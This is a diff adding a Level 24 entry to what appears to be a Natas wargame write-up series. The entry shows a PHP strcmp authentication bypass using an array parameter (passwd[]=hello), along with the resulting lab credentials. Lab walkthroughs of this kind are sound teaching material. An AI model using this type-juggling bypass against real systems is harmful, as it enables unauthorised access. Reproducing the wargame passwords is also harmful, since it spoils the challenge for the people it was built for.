@@ -537,15 +537,34 @@ Reference:
 - http://php.net/manual/en/language.types.string.php#language.types.string.conversion
 - https://linux.die.net/man/3/strtod
 
+### Level 24 - `strcmp` return value
+```
+http://natas.natas.labs.overthewire.org/ natas gtVrDuiDfck831PqWsLEZy5gyDz1clto
+```
+The only check relies on the `strcmp` function:
+```php
+if(!strcmp($_REQUEST["passwd"],"<censored>")){
+  // good boy
+}
+```
+
+Check the return values on [php.net/strcmp](http://php.net/manual/en/function.strcmp.php). The first comment points out that if parameters are not string, it will return `NULL`. `NULL` will allow us to get into that condition because instead of using `strcmp() === 0` (as they do in [the first example on php.net](http://php.net/manual/en/function.strcmp.php#example-6112)), natas24 uses `!`. In fact, any error will return `NULL`.
+
+Let's trigger an error with `passwd[]=hello`: http://natas24.natas.labs.overthewire.org/?passwd[]=hello
+```
+Username: natas25
+Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+```
+
 
 Reference:
-- http://php.net/manual/en/function.strstr.php
+- http://php.net/manual/en/function.strcmp.php#108563
 
 ### Level  -
 ```
 http://natas.natas.labs.overthewire.org/ natas gtVrDuiDfck831PqWsLEZy5gyDz1clto
 ```
-``
+
 
 
 This post is part of a series:
